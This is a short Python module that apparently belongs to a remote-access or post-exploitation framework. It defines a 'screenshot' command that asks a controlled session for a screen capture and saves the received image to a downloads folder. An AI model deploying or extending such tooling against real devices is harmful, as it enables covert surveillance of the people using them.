import json
import time
import os
import modules.helper as h

class command:
    def __init__(self):
        self.name = "screenshot"
        self.description = "take screenshot"
        self.type = "native"

    def run(self,session,cmd_data):
    	result = json.loads(session.send_command(cmd_data))
    	if 'error' in result:
    		h.info_error(result['error'])
    		return
    	elif 'size' in result:
			size = int(result['size'])
			data = session.sock_receive_data(size)
			file_name = "screenshot_{0}.jpg".format(int(time.time()))
			h.info_general("Saving {0}".format(file_name))
			# save to file
			f = open(os.path.join('downloads',file_name),'w')
			f.write(data)
			f.close()
			h.info_general("Saved to ./downloads/{0}".format(file_name))
